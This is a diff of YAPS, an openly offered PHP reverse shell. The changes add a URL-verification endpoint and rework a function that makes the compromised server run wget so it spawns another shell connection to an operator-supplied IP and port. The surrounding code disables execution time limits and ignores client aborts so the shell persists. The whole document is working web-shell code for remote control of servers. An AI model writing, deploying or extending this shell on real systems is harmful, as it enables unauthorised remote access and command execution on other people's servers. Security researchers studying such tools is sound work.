@@ -1,12 +1,12 @@
 <?php
 # YAPS - Yet Another PHP Shell
-# Version 1.2.1 - 28/07/21
+# Version 1.3.1 - 01/08/21
 # Made by Nicholas Ferreira
 # https://github.com/Nickguitar/YAPS
 
 
 //error_reporting(0);
-$version = "1.3";
+$version = "1.3.1";
 set_time_limit(0);
 ignore_user_abort(1);
 ini_set('max_execution_time', 0);
@@ -32,6 +32,8 @@ $salt = 'v_3_r_Y___G_o_0_d___s_4_L_t';
 $pass_hash = "f00945860424fa6148e329772c08e7d05d7fab6f69a4722b4c66c164acdb018ecc0cbc62060cc67e7ae962c65ab5967620622cc12206627229b94106b66db6b8"; // default: pass123
 $auto_verify_update = false; // if true, will check on every run for update
 $silent = false; //if true, does not display banner on connect
+
+if(isset($_GET['vrfy'])) die("baguvix"); //verification
 
 ######################### END CONFIGS #########################
 
@@ -593,17 +595,30 @@ function passwd(){
 function duplicate(){
 	global $s,$ip,$port,$_SERVER;
 
-	$curl_url = $_SERVER["REQUEST_SCHEME"]."://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; // htt(p|ps) :// website.com /files/yaps.php
+	if(!isset($_SERVER["REQUEST_SCHEME"]) || !isset($_SERVER["HTTP_HOST"]) || !isset($_SERVER["REQUEST_URI"])){
+		fwrite($s, yellow("[-] ")."Couldn't find YAPS URL. Did you run me via command line?\nPlease provide the correct YAPS URL (example.com/files/yaps.php): ");
+		while($yaps_url = fread($s, 256)){
+			if(get_request(preg_replace("/\n/", "",$yaps_url."?vrfy")) !== "baguvix")
+				return fwrite($s, red("[-] ")."Couldn't validade YAPS URL. Is this the correct URL?\n");
+		break;
+		}
+		$curl_url = $yaps_url;
+	}else{
+		$curl_url = $_SERVER["REQUEST_SCHEME"]."://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; // htt(p|ps) :// website.com /files/yaps.php
+		echo $curl_url;
+	}
+
 	fwrite($s, cyan("[*] ")."Choose a port to listen (default: $port): ");
 
 	while($new_port = fread($s, 32)){
 		$new_port = (base64_encode($new_port) == "Cg==") ? $port: substr($new_port,0,-1); //if new_port= newline, new_port = old port
 		$socket = array('x' => $ip.":".$new_port);
 		fwrite($s, "Connecting to ".$ip.":".$new_port."\n");
+		$cmd = "wget -qO- --post-data=\"".http_build_query($socket)."\" $curl_url > /dev/null";
 		if(isAvailable("popen") && isAvailable("pclose"))
-			pclose(popen("wget --post-data=\"".http_build_query($socket)."\" $curl_url > /dev/null &",'r')); // doesn't wait for wget to return
+			pclose(popen($cmd." &",'r')); // doesn't wait for wget to return
 		else
-			run_cmd("timeout --kill-after 0 1 wget --post-data=\"".http_build_query($socket)."\" $curl_url > /dev/null"); // thx znttfox =)
+			run_cmd("timeout --kill-after 0 1 ".$cmd); // thx znttfox =)
 		return;
 	}
 }
